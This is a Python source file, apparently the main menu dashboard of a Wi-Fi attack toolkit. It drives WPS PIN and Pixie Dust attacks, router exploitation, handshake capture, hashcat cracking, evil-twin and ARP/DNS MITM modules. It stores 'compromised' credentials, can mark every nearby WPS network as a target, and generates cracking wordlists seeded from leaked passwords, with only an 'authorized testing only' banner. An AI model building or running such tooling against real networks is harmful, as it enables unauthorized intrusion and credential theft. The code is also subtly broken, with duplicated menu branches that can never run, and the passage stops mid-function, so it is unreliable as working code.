#!/usr/bin/env python3
"""WPS Toolkit - Professional Dashboard"""

import sys
import os
import time
import shutil
import signal
from datetime import datetime
from pathlib import Path

# Auto-install deps
for mod, pkg in [("rich","rich"),("psutil","psutil")]:
    try:
        __import__(mod)
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", pkg])

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.rule import Rule
from rich.text import Text
from rich.layout import Layout
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box
import psutil

# Ensure modules path
sys.path.insert(0, str(Path(__file__).parent))

from config import Config
from database import Database
from modules.scanner import scan_iw, get_interface_mode, get_interfaces
from modules.wps_pins import classify_model_vulnerability, classify_pixie_resistance, suggest_pins
from modules.attack import run_wps_attack, analyze_target, run_smart_attack
from modules.target_assessment import TargetAssessor, history_from_db
from modules.safety_gates import gate_online_wps, evaluate_signal
from modules.playbooks import build_playbook
from modules.isp_passwords import candidates_for_target, format_candidates
from modules.evidence import write_attack_evidence, write_lab_note_md

from modules.monitor_mode import (
    get_mode, enable_monitor, disable_monitor, set_channel,
    kill_processes, get_iw_dev, iface_up, iface_down
)
from modules.reports import generate_html, export_json, export_diagnostics_json
from modules.wpa_supplicant import WpaSupplicant
from modules.wpa_engine import WpsEngine
from modules.auto_wps import AutoWPS
from modules.router_exploit import RouterExploiter, get_router_ip
from modules.wordlist import WordlistGenerator
from modules.handshake import HandshakeCapture, HandshakeAnalyzer
from modules.passive_capture import PassiveHandshakeCapture
from modules.hashcat_runner import HashcatRunner
from modules.recon import NetworkRecon
from modules.evil_twin import EvilTwin, cleanup_portal
from modules.lan_mitm import LanMitmLab, detect_tools, install_hints, is_private_ipv4, is_valid_ipv4
from modules.diagnostics import run_diagnostics, format_summary
from modules.wps_pins import get_pin_database_info, get_vulnerability_pattern_stats

THEME = {
    "ok": "bold green", "err": "bold red", "warn": "bold yellow",
    "inf": "cyan", "dim": "dim white", "hdr": "bold cyan",
    "mn": "bold green", "wps_on": "bold green",
    "wps_off": "bold red", "wps_unk": "yellow",
}
from rich.theme import Theme
con = Console(theme=Theme(THEME))


def banner():
    con.print("""
[hdr]╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ██╗    ██╗██████╗ ███████╗    ██╗  ██╗██╗████████╗     ║
║   ██║    ██║██╔══██╗██╔════╝    ██║ ██╔╝██║╚══██╔══╝     ║
║   ██║ █╗ ██║██████╔╝███████╗    █████╔╝ ██║   ██║        ║
║   ██║███╗██║██╔═══╝ ╚════██║    ██╔═██╗ ██║   ██║        ║
║   ╚███╔███╔╝██║     ███████║    ██║  ██╗██║   ██║        ║
║    ╚══╝╚══╝ ╚═╝     ╚══════╝    ╚═╝  ╚═╝╚═╝   ╚═╝        ║
║                                                           ║
║        Professional WPS Security Testing Suite             ║
║              For Authorized Testing Only                   ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝[/]""")


def status_bar(mon_start, db):
    uptime = int(time.time() - mon_start)
    ut = "{:02d}:{:02d}:{:02d}".format(uptime//3600, (uptime%3600)//60, uptime%60)
    cpu = psutil.cpu_percent(interval=0.1)
    mem = psutil.virtual_memory().percent
    st = db.get_stats()
    cc = "green" if cpu < 60 else ("yellow" if cpu < 85 else "red")
    mc = "green" if mem < 60 else ("yellow" if mem < 85 else "red")
    con.print(Panel(
        f"  {ut}  |  CPU:[{cc}]{cpu}%[/]  |  RAM:[{mc}]{mem}%[/]  |  "
        f"Nets:[inf]{st['total']}[/]  WPS:[ok]{st['wps']}[/]  "
        f"Tgts:[warn]{st['targets']}[/]  Creds:[ok]{st['compromised']}[/]",
        style="dim", height=3))


def _get_field(obj, key, default="?"):
    """Get field from dict or sqlite3.Row safely"""
    try:
        val = obj[key]
        return val if val is not None else default
    except (KeyError, IndexError):
        return default


def _credential_fields_for_result(result):
    """Return only verified PIN/PSK values for a real success result."""
    if not isinstance(result, dict):
        return None, None
    if result.get("status") != "success":
        return None, None
    psk = result.get("psk")
    if not psk:
        return None, None
    pin = result.get("pin")
    if result.get("attempted_pin") == "PBC":
        pin = None
    elif not pin:
        return None, None
    return pin, psk


def _print_attack_result(result):
    """Display verified credentials; also surface unverified Pixie PIN."""
    verified_pin, verified_psk = _credential_fields_for_result(result)
    if verified_pin:
        con.print("\n[ok]PIN VERIFIED: {value}[/]".format(value=verified_pin))
    if verified_psk:
        con.print("[ok]PSK FOUND: {value}[/]".format(value=verified_psk))

    if not isinstance(result, dict):
        return
    status = result.get("status")
    if status == "pixie_pin_unverified":
        pin = result.get("pin") or result.get("pixie_pin") or result.get("attempted_pin")
        if pin:
            con.print("\n[warn]PIXIE PIN (offline, PSK not verified yet): {value}[/]".format(
                value=pin
            ))
            con.print(
                "[dim]Retry Attack Center → PIN Attack with this PIN when signal is stronger.[/]"
            )
    elif status == "pixie_not_vulnerable":
        con.print("\n[err]Pixie: AP not vulnerable (full data, no PIN).[/]")
    elif status and status not in ("success", "completed") and not verified_psk:
        con.print("\n[dim]Result status: {st}[/]".format(st=status))


def _vulnerability_label(model, device):
    """Return UI label for exact vulnerability vs vendor heuristic."""
    classification = classify_model_vulnerability(model, device)
    return classification


def net_table(nets, title="Networks"):
    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan",
              border_style="cyan", title="[hdr]" + title + "[/]", padding=(0,1))
    t.add_column("#", style="dim", width=3, justify="center")
    t.add_column("ESSID", min_width=16)
    t.add_column("BSSID", style="cyan", min_width=17)
    t.add_column("CH", width=4, justify="center")
    t.add_column("RSSI", width=6, justify="center")
    t.add_column("WPS", justify="center")
    t.add_column("Lock", justify="center")
    t.add_column("Enc")
    t.add_column("Model", min_width=12)

    for i, n in enumerate(nets, 1):
        essid = str(_get_field(n, "essid", "Hidden"))
        if not essid or essid == "None":
            essid = "Hidden"
        bssid = str(_get_field(n, "bssid"))
        ch = str(_get_field(n, "channel", "?"))
        rssi = str(_get_field(n, "rssi", "?"))
        has_wps = int(_get_field(n, "has_wps", 0))
        lock = str(_get_field(n, "wps_locked", "Unknown"))
        enc = str(_get_field(n, "encryption", ""))
        model = str(_get_field(n, "wps_model", ""))

        wps_d = "[wps_on]Yes[/]" if has_wps else "[dim]-[/]"
        lock_d = "[wps_on]Open[/]" if lock == "No" else (
            "[wps_off]Locked[/]" if lock == "Yes" else "[wps_unk]?[/]")
        try:
            rv = int(rssi)
            rc = "green" if rv > -50 else ("yellow" if rv > -70 else "red")
        except (ValueError, TypeError):
            rc = "white"

        t.add_row(str(i), essid, bssid, ch, f"[{rc}]{rssi}[/]",
                  wps_d, lock_d, enc, model[:20] if model else "")
    con.print(t)


class App:
    def __init__(self):
        self.cfg = Config()
        self.db = Database()
        self.start_time = time.time()
        self.running = True

    def run(self):
        self._init()
        while self.running:
            try:
                con.clear()
                banner()
                status_bar(self.start_time, self.db)

                menu = Table(show_header=False, box=box.SIMPLE, padding=(0,2))
                menu.add_column("#", style="mn", width=4, justify="center")
                menu.add_column("Option", style="white", min_width=30)
                items = [
                    ("1","Network Scanner"), ("2","Target Management"),
                    ("3","Monitor Mode Manager"), ("4","Attack Center"),
                    ("5","wpa_supplicant Manager"), ("6","Auto-WPS"),
                    ("7","Router Exploiter"), ("8","Wordlist Generator"),
                    ("9","Handshake Capture"), ("10","Hashcat Cracker"),
                    ("11","Network Recon"), ("12","Evil Twin"),
                    ("13","LAN MITM Lab (ARP/DNS)"), ("14","Live Monitor"),
                    ("15","Credentials Vault"), ("16","Reports"),
                    ("17","Device Info"), ("18","System Diagnostics"),
                    ("19","Candidate PIN Vault"), ("20","First-Target Wizard"),
                    ("A","Settings"),
                    ("0","Exit"),
                ]
                for n, m in items:
                    menu.add_row(n, m)
                con.print(Panel(menu, border_style="cyan", padding=(1,2)))

                ch = Prompt.ask("[hdr]Select[/]",
                               choices=["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","a","A"],
                               default="1")
                actions = {
                    "1": self.view_scanner, "2": self.view_targets,
                    "3": self.view_monitor, "4": self.view_attack,
                    "5": self.view_wpa, "6": self.view_auto_wps,
                    "7": self.view_router_exploit, "8": self.view_wordlist,
                    "9": self.view_handshake, "10": self.view_hashcat,
                    "11": self.view_recon, "12": self.view_evil_twin,
                    "13": self.view_lan_mitm, "14": self.view_live,
                    "15": self.view_creds, "16": self.view_reports,
                    "17": self.view_device, "18": self.view_diagnostics,
                    "19": self.view_candidate_pins, "20": self.view_first_target_wizard,
                    "a": self.view_settings, "A": self.view_settings,
                }
                if ch == "0":
                    self._exit()
                elif ch in actions:
                    actions[ch]()
            except KeyboardInterrupt:
                self._exit()
                break
            except Exception as e:
                con.print(f"[err]Error: {e}[/]")
                import traceback
                traceback.print_exc()
                Prompt.ask("[dim]Enter[/]")

    def _init(self):
        con.clear()
        banner()
        if os.getuid() != 0:
            con.print("[warn]Not root! Some features may not work.[/]")
            time.sleep(1)

        con.print("[ok]Using built-in WPS Engine (WpsEngine)[/]")

        # Offline intelligence status — critical for beginners
        pin_info = get_pin_database_info()
        pin_version = pin_info.get("database_version", "unavailable")
        pin_prefixes = pin_info.get("prefix_count", 0)
        pin_pins = pin_info.get("pin_count", 0)
        if pin_version in ("unavailable", "unknown") or not pin_prefixes:
            con.print(
                "[err]WPS PIN intelligence missing/empty.[/] "
                "Run: [inf]python3 tools/build_pin_database.py --merge-static[/]"
            )
        else:
            con.print(
                "[ok]PIN intelligence:[/] {ver} "
                "([inf]{prefixes}[/] prefixes / [inf]{pins}[/] pins)".format(
                    ver=pin_version,
                    prefixes=pin_prefixes,
                    pins=pin_pins,
                )
            )

        try:
            vuln_stats = get_vulnerability_pattern_stats()
            con.print(
                "[ok]Model patterns:[/] {known} known / {heur} heuristic".format(
                    known=vuln_stats.get("known_vulnerable_patterns", 0),
                    heur=vuln_stats.get("vendor_heuristic_patterns", 0),
                )
            )
        except Exception:
            pass

        iface = self.cfg.get("interface", "wlan0")
        con.print("[dim]Interface: {iface} | data: {db}[/]".format(
            iface=iface,
            db=str(Path(__file__).parent / "data"),
        ))
        con.print(
            "[dim]Tip: menu 18 = System Diagnostics | "
            "Authorized testing only[/]"
        )

        self.db.log(
            "startup",
            "system",
            "WPS Toolkit started pin_db={ver} prefixes={p}".format(
                ver=pin_version,
                p=pin_prefixes,
            ),
        )
        time.sleep(1.5)

    def _exit(self):
        con.print("\n[hdr]Shutting down...[/]")
        if self.cfg.get("auto_backup"):
            try:
                p = self.db.backup()
                con.print(f"[dim]Backup: {p}[/]")
            except Exception:
                pass
        self.db.log("shutdown", "system", "WPS Toolkit shutdown")
        self.db.close()
        con.print("[ok]Goodbye![/]\n")
        self.running = False

    # ═══════════════════════════════════════
    # VIEW: SCANNER
    # ═══════════════════════════════════════
    def view_scanner(self):
        con.clear()
        con.print(Rule("[hdr]Network Scanner[/]", style="cyan"))
        iface = self.cfg.get("interface", "wlan0")
        mode = get_interface_mode(iface)
        ms = 'ok' if mode == 'monitor' else 'warn'
        con.print(f"\n  Interface: [inf]{iface}[/]  Mode: [{ms}]{mode}[/]")

        con.print("\n  [mn]1[/] - Scan (iw dev scan)")
        con.print("  [mn]2[/] - Change Interface")
        con.print("  [mn]0[/] - Back\n")

        ch = Prompt.ask("Select", default="1")
        if ch == "0":
            return
        if ch == "2":
            ifaces = get_interfaces()
            if ifaces:
                for i, f in enumerate(ifaces, 1):
                    con.print(f"  [{i}] {f} ({get_interface_mode(f)})")
            iface = Prompt.ask("Interface", default=iface)
            self.cfg.set("interface", iface)
            con.print("[ok]Done[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        # Ask to clear old data
        st = self.db.get_stats()
        if st['total'] > 0:
            con.print(f"\n[inf]DB has {st['total']} old networks[/]")
            if Confirm.ask("Clear old data before scan?", default=False):
                self.db.execute("DELETE FROM networks")
                con.print("[ok]Old data cleared[/]")

        timeout = self.cfg.get("scan_timeout", 20)
        con.print(f"\n[inf]Scanning {iface} ({timeout}s)...[/]\n")

        try:
            with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                         BarColumn(bar_width=30), console=con) as prog:
                task = prog.add_task("Scanning WPS networks...", total=None)
                networks = scan_iw(iface, timeout)
                prog.update(task, completed=1, total=1)
        except Exception:
            networks = scan_iw(iface, timeout)

        nc = 0
        for n in networks:
            if not self.db.get_network(_get_field(n, "bssid")):
                nc += 1
            self.db.add_network(n)

        if networks:
            net_table(networks, f"Scan Results ({len(networks)} WPS networks)")

            con.print(f"\n  [inf]Found: {len(networks)} | New: {nc}[/]\n")

            for n in networks[:5]:
                pins = suggest_pins(_get_field(n, "bssid"))[:5]
                vulnerability = _vulnerability_label(
                    n.get("wps_model", ""),
                    n.get("wps_device", ""),
                )
                vuln_tag = ""
                if vulnerability["status"] == "known_vulnerable":
                    vuln_tag = " [ok](Known vulnerable: {match})[/]".format(
                        match=vulnerability["match"]
                    )
                elif vulnerability["status"] == "vendor_heuristic":
                    vuln_tag = " [warn](Vendor heuristic: {match})[/]".format(
                        match=vulnerability["match"]
                    )
                lock_tag = f" [wps_off]LOCKED[/]" if _get_field(n, "wps_locked") == "Yes" else (
                    " [wps_on]OPEN[/]" if _get_field(n, "wps_locked") == "No" else "")
                con.print(f"  [inf]{n['essid']}[/] ({n['bssid']}){vuln_tag}{lock_tag}")
                if pins:
                    pin_str = ', '.join(p['pin'] + '(' + p['method'] + ')' for p in pins[:4])
                    con.print(f"    PINs: {pin_str}")

            if Confirm.ask("\n  Select targets?", default=False):
                for n in networks:
                    con.print(f"  [inf]{n['essid']}[/] ({n['bssid']})")
                    if Confirm.ask("    Target?", default=False):
                        nid = self.db.add_network(n)
                        self.db.set_target(nid, True)
                        con.print("    [ok]Added[/]")
        else:
            con.print("[warn]No WPS networks found.[/]")
            con.print("[dim]Tips: Make sure interface is in managed mode for iw scan[/]")

        self.db.add_scan_record(iface, "iw", timeout, len(networks), nc)
        self.db.log("scan", "scanner", f"Found {len(networks)} WPS networks ({nc} new)")
        Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: TARGETS
    # ═══════════════════════════════════════
    def view_targets(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Target Management[/]", style="cyan"))
            st = self.db.get_stats()
            con.print(f"\n  [inf]Nets: {st['total']} | WPS: {st['wps']} | Targets: {st['targets']}[/]")
            con.print("\n  [mn]1[/] All  [mn]2[/] Targets  [mn]3[/] Search")
            con.print("  [mn]4[/] Add BSSID  [mn]5[/] Remove  [mn]6[/] Mark All WPS")
            con.print("  [mn]7[/] Notes  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                nets = self.db.get_all_networks()
                if nets:
                    net_table(nets, f"All Networks ({len(nets)})")
                else:
                    con.print("[warn]No networks. Run scan first.[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                tgts = self.db.get_targets()
                if tgts:
                    net_table(tgts, f"Targets ({len(tgts)})")
                else:
                    con.print("[warn]No targets.[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                essid = Prompt.ask("ESSID")
                gen = WordlistGenerator()
                words = gen.generate_from_essid(essid)
                con.print("\n[ok]{n} passwords:[/]".format(n=len(words)))
                for w in words[:30]:
                    con.print("  {w}".format(w=w))
                if len(words) > 30:
                    con.print("  ... +{n} more".format(n=len(words) - 30))
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "4":
                con.print(
                    "[ok]Realistic Morocco wordlist: 500,000 passwords\n"
                    "Length 8–12 balanced · MoroccanRockyou + ISP/names · no random spam[/]"
                )
                essid = Prompt.ask("Seed ESSID", default="Wifi_Maroc_Home_2026")
                brand = Prompt.ask("Seed brand/ISP", default="inwi")
                model = Prompt.ask("Seed model", default="HG6145F1")
                count = IntPrompt.ask("Count", default=500000)
                out = Prompt.ask(
                    "Output file",
                    default=str(Path("data/wordlists/realistic_ma_500k_2026.txt")),
                )
                if not Confirm.ask("Start generation?", default=True):
                    continue
                with con.status("[ok]Building realistic list...[/]", spinner="dots"):
                    import subprocess, sys as _sys
                    script = Path(__file__).parent / "tools" / "build_realistic_wordlist.py"
                    try:
                        r = subprocess.run(
                            [
                                _sys.executable, str(script),
                                "--count", str(count),
                                "--output", out,
                                "--essid", essid,
                                "--brand", brand,
                                "--model", model,
                            ],
                            capture_output=True,
                            text=True,
                            timeout=1800,
                            cwd=str(Path(__file__).parent),
                        )
                        if r.stdout:
                            con.print(r.stdout[-1200:])
                        if r.returncode != 0:
                            con.print("[err]{e}[/]".format(e=(r.stderr or "failed")[-500:]))
                        elif Path(out).exists():
                            n = sum(1 for _ in open(out, "rb"))
                            size = Path(out).stat().st_size
                            con.print(
                                "[ok]Saved {n} passwords → {p} ({mb:.1f} MB)[/]".format(
                                    n=n, p=out, mb=size/(1024*1024.0)
                                )
                            )
                    except Exception as exc:
                        con.print("[err]{e}[/]".format(e=exc))
                con.print(
                    "[dim]hashcat -m 22000 capture.hc22000 {p}[/]".format(p=out)
                )
                con.print(
                    "[dim]Seeds: MoroccanRockyou + ISP/local patterns (8–12 only)[/]"
                )
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "5":
                con.print(
                    "[warn]Quick 1,000,000 pack (no full MoroccanRockyou merge path).[/]"
                )
                essid = Prompt.ask("Seed ESSID", default="Wifi_Maroc_Home_2026")
                count = IntPrompt.ask("Count", default=1000000)
                out = Prompt.ask(
                    "Output file",
                    default=str(Path("data/wordlists/mega_1m_2026.txt")),
                )
                if not Confirm.ask("Start?", default=True):
                    continue
                with con.status("[ok]Generating...[/]", spinner="dots"):
                    gen = WordlistGenerator()
                    words = gen.generate_mega(max_words=count, essid=essid, brand="inwi")
                    n = gen.save_list(words, out)
                con.print("[ok]Saved {n} → {p}[/]".format(n=n, p=out))
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "6":
                con.print(
                    "[inf]CLI:[/]\n"
                    "  python3 tools/build_mega_wordlist.py --count 5000000\n"
                    "  python3 tools/build_mega_wordlist.py --essid Fibre_inwi_2.4G_5807\n"
                    "Output: data/wordlists/mega_ma_5m_2026.txt\n\n"
                    "[inf]Seeds:[/]\n"
                    "  • MoroccanRockyou (ydy4) — leaked/research MA passwords\n"
                    "  • Local ISP/name/city/phone/2026 smart patterns\n"
                    "Authorized testing / password hygiene only."
                )
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                b = Prompt.ask("BSSID").strip().upper()
                n = self.db.get_network(b)
                if n:
                    self.db.set_target(_get_field(n, "id"), True)
                    con.print(f"[ok]{n['essid']} added as target[/]")
                else:
                    con.print("[warn]Not in database. Run scan first.[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                tgts = self.db.get_targets()
                if tgts:
                    net_table(tgts, "Targets")
                    b = Prompt.ask("BSSID to remove (or 'all')").strip()
                    if b.lower() == "all":
                        self.db.execute("UPDATE networks SET is_target=0")
                        con.print("[ok]All targets cleared[/]")
                    else:
                        n = self.db.get_network(b.upper())
                        if n:
                            self.db.set_target(_get_field(n, "id"), False)
                            con.print("[ok]Removed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                self.db.execute("UPDATE networks SET is_target=1 WHERE has_wps=1")
                c = self.db.fetch_one("SELECT COUNT(*) c FROM networks WHERE is_target=1 AND has_wps=1")["c"]
                con.print(f"[ok]{c} WPS networks marked as targets[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "7":
                b = Prompt.ask("BSSID").strip().upper()
                n = self.db.get_network(b)
                if n:
                    con.print(f"  {n['essid']} ({b})")
                    notes = Prompt.ask("Notes", default=n["notes"] or "")
                    self.db.execute("UPDATE networks SET notes=? WHERE id=?", (notes, _get_field(n, "id")))
                    con.print("[ok]Updated[/]")
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: MONITOR MODE
    # ═══════════════════════════════════════
    def view_monitor(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Monitor Mode Manager[/]", style="cyan"))
            iface = self.cfg.get("interface", "wlan0")
            mode = get_mode(iface)
            ms = 'ok' if mode == 'monitor' else 'warn'
            con.print(f"\n  Interface: [inf]{iface}[/]  Mode: [{ms}]{mode}[/]")
            con.print("\n  [mn]1[/] Enable Monitor  [mn]2[/] Disable Monitor")
            con.print("  [mn]3[/] Kill Processes  [mn]4[/] Interface Up")
            con.print("  [mn]5[/] Interface Down  [mn]6[/] iw dev")
            con.print("  [mn]7[/] Set Monitor Channel  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                con.print("[warn]Android Wi-Fi will be disabled temporarily.[/]")
                if Confirm.ask("Continue?", default=True):
                    with con.status("[inf]Enabling monitor...[/]", spinner="dots"):
                        mon = enable_monitor(iface)
                    if mon:
                        con.print(f"[ok]Monitor mode: {mon}[/]")
                        self.cfg.set("interface", mon)
                    else:
                        con.print("[err]Failed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                disable_monitor(iface)
                con.print("[ok]Monitor disabled[/]")
                self.cfg.set("interface", "wlan0")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                out = kill_processes()
                con.print(f"[ok]Processes killed[/]")
                if out:
                    con.print(f"[dim]{out[:200]}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                iface_up(iface)
                con.print("[ok]Up[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                iface_down(iface)
                con.print("[ok]Down[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                con.print(Panel(get_iw_dev(), title="iw dev"))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "7":
                # Qualcomm can change the channel only after con_mode=4.
                # Automatically offer to enable monitor mode instead of
                # returning an unexplained failure while still managed.
                if get_mode(iface) != "monitor":
                    con.print("[warn]Interface is still managed; monitor mode is required.[/]")
                    auto_enable = Confirm.ask("Enable monitor mode now?", default=True)
                    if auto_enable:
                        with con.status("[inf]Enabling monitor...[/]", spinner="dots"):
                            monitor_iface = enable_monitor(iface)
                        if monitor_iface:
                            iface = monitor_iface
                            self.cfg.set("interface", monitor_iface)
                            con.print("[ok]Monitor mode: {iface}[/]".format(
                                iface=monitor_iface
                            ))
                        else:
                            con.print("[err]Could not enable monitor mode[/]")
                            Prompt.ask("\n[dim]Enter[/]")
                            continue
                    else:
                        Prompt.ask("\n[dim]Enter[/]")
                        continue

                channel = IntPrompt.ask("Channel", default=8)
                width = IntPrompt.ask(
                    "Width: 0=20MHz, 1=40MHz, 2=80MHz",
                    default=0,
                )
                if set_channel(iface, channel, width):
                    con.print("[ok]Channel set successfully[/]")
                else:
                    con.print("[err]Failed to set channel[/]")
                    con.print("[dim]Verify con_mode=4 and that iwpriv exposes setMonChan.[/]")
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: ATTACK CENTER
    # ═══════════════════════════════════════
    def view_attack(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Attack Center[/]", style="cyan"))
            iface = self.cfg.get("interface", "wlan0")
            mode = get_mode(iface)
            tgts = self.db.get_targets()
            ms = 'ok' if mode == 'monitor' else 'warn'
            con.print(f"\n  Interface: [inf]{iface}[/]  Mode: [{ms}]{mode}[/]")
            con.print(f"  Targets: [inf]{len(tgts)}[/]")

            con.print("  [mn]1[/] Smart Attack (auto PIN)")
            con.print("  [mn]2[/] Pixie Dust  [mn]3[/] Suggested PIN Sweep")
            con.print("  [mn]4[/] PIN Attack  [mn]5[/] Attack from Targets")
            con.print("  [mn]6[/] History  [mn]7[/] Auto Target Assessment")
            con.print("  [mn]0[/] Back")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                self._smart_attack()
            elif ch == "6":
                self._show_history()
            elif ch == "7":
                self._auto_target_assessment()
            elif ch in ("2","3","4","5"):
                self._launch_attack(ch)

    def _auto_target_assessment(self):
        """Offline-first method planner backed by versioned WPS intelligence."""
        con.clear()
        con.print(Rule("[hdr]Auto Target Assessment[/]", style="cyan"))
        con.print(
            "[dim]Offline analysis first: no PIN, Pixie, PMKID or injection traffic "
            "is sent by this assessment.[/]\n"
        )

        iface = self.cfg.get("interface", "wlan0")
        if get_mode(iface) == "monitor":
            con.print("[dim]Restoring managed mode for a fresh scan...[/]")
            if not disable_monitor(iface):
                con.print("[err]Could not restore managed mode[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            iface = "wlan0"
            self.cfg.set("interface", iface)

        bssid, essid = self._select_target(fresh_scan=True)
        if not bssid:
            return

        network = self.db.get_network(bssid)
        if not network:
            network = {
                "bssid": bssid,
                "essid": essid,
                "channel": 0,
                "rssi": 0,
                "encryption": "Unknown",
                "has_wps": 0,
                "wps_locked": "Unknown",
                "wps_version": "",
                "wps_model": "",
                "wps_device": "",
            }

        hist = history_from_db(self.db, bssid)
        assessor = TargetAssessor(
            internal_monitor=True,
            internal_injection=False,
            history=hist,
        )
        report = assessor.assess(network)
        assessment_id = self.db.save_assessment(report)

        con.print("\n[hdr]Target[/]")
        con.print("  ESSID:       [inf]{value}[/]".format(value=report["essid"]))
        con.print("  BSSID:       [inf]{value}[/]".format(value=report["bssid"]))
        con.print("  Channel:     {value}".format(value=report["channel"]))
        con.print("  Signal:      {rssi} dBm ({grade})".format(
            rssi=report["rssi"],
            grade=report["signal_grade"],
        ))
        con.print("  Encryption:  {value}".format(value=report["encryption"]))
        con.print("  WPS version: {value}".format(value=report.get("wps_version") or "?"))
        con.print("  Manufacturer:{value}".format(value=report["manufacturer"]))
        con.print("  Model:       {value}".format(value=report["model"] or "Unknown"))
        if report.get("isp_essid"):
            con.print("  [warn]ISP/fibre ESSID pattern detected[/]")

        con.print("\n[hdr]Capability Matrix[/]")
        wps_state = "Yes" if report["has_wps"] else "No"
        if report.get("pixie_candidate"):
            pixie_state = "{tier} ({conf}%)".format(
                tier=str(report.get("pixie_tier") or "yes").upper(),
                conf=report.get("pixie_confidence", 0),
            )
        else:
            pixie_state = "No ({conf}%)".format(conf=report.get("pixie_confidence", 0))
        pmkid_state = "Candidate" if report["pmkid_candidate"] else "No"
        passive_state = "Candidate" if report["passive_candidate"] else "No"
        con.print("  WPS detected:       {value} (Lock: {lock})".format(
            value=wps_state,
            lock=report["wps_locked"],
        ))
        con.print("  Known OUI PINs:     {value}".format(
            value=report["known_pin_count"]
        ))
        con.print("  PIN path conf:      {value}% — {reason}".format(
            value=report.get("pin_path_confidence", 0),
            reason=report.get("pin_path_reason", ""),
        ))
        con.print("  Max online PINs:    {value} (budget)".format(
            value=report.get("max_online_pins", 3)
        ))
        con.print("  Pixie Dust:         {value}".format(value=pixie_state))
        con.print("  Managed PMKID:      {value}".format(value=pmkid_state))
        con.print("  Passive handshake:  {value}".format(value=passive_state))
        con.print("  Internal injection: No (QCACLD receive-only)")
        if report.get("pixie_reasons"):
            con.print("\n[hdr]Pixie reasoning[/]")
            for reason in report.get("pixie_reasons")[:6]:
                con.print("  [dim]• {r}[/]".format(r=reason))
        if report.get("attack_order"):
            con.print("\n[hdr]Suggested order[/]")
            con.print("  {order}".format(order=" → ".join(report["attack_order"][:6])))

        con.print("\n[hdr]Intelligence Database[/]")
        con.print("  Version:  [inf]{value}[/]".format(
            value=report["intelligence_version"]
        ))
        con.print("  Prefixes: {value}".format(value=report["intelligence_prefixes"]))
        con.print("  PINs:     {value}".format(value=report["intelligence_pins"]))

        if report["has_wps"] and report["pin_candidates"]:
            con.print("\n[hdr]Top Authorized-Test PIN Candidates[/]")
            for index, candidate in enumerate(report["pin_candidates"][:8], 1):
                con.print(
                    "  {index}. {pin}  {method}  confidence:{confidence}%".format(
                        index=index,
                        pin=candidate["pin"],
                        method=candidate["method"],
                        confidence=candidate["confidence"],
                    )
                )

        if report["warnings"]:
            con.print("\n[hdr]Warnings[/]")
            for warning in report["warnings"]:
                con.print("  [warn]• {value}[/]".format(value=warning))

        con.print("\n  Readiness score: [inf]{value}/100[/]".format(
            value=report["readiness_score"]
        ))
        con.print("  Recommended: [ok]{value}[/]".format(
            value=report["recommended_method"]
        ))
        con.print("  Saved assessment ID: {value}".format(value=assessment_id))

        # Assessment is offline by design, but it can hand the selected target
        # directly to one explicitly authorized next action.
        actions = {}
        next_number = 1
        con.print("\n[hdr]Available Authorized Next Actions[/]")
        # Offer actions following attack_order preference
        offered = set()
        for method in report.get("attack_order") or []:
            if method in ("known_pin_sweep", "calculated_pin_sweep") and "pin_sweep" not in offered:
                if report["has_wps"] and report["wps_locked"].lower() != "yes":
                    actions[str(next_number)] = "pin_sweep"
                    con.print("  [mn]{number}[/] Suggested PIN Sweep (budget {n})".format(
                        number=next_number,
                        n=report.get("max_online_pins", 3),
                    ))
                    next_number += 1
                    offered.add("pin_sweep")
            elif method == "managed_pmkid_probe" and report["pmkid_candidate"] and "pmkid" not in offered:
                actions[str(next_number)] = "pmkid"
                con.print("  [mn]{number}[/] Managed PMKID probe".format(number=next_number))
                next_number += 1
                offered.add("pmkid")
            elif method == "passive_handshake_wait" and report["passive_candidate"] and "passive" not in offered:
                actions[str(next_number)] = "passive"
                con.print("  [mn]{number}[/] Passive handshake wait".format(number=next_number))
                next_number += 1
                offered.add("passive")
            elif method in ("pixie_probe", "pixie_probe_last_resort") and report.get("pixie_candidate") and "pixie" not in offered:
                label = "Pixie Dust probe"
                if report.get("pixie_tier") == "low":
                    label = "Pixie Dust (LAST RESORT, conf {c}%)".format(
                        c=report.get("pixie_confidence", 0)
                    )
                elif report.get("pixie_tier") == "high":
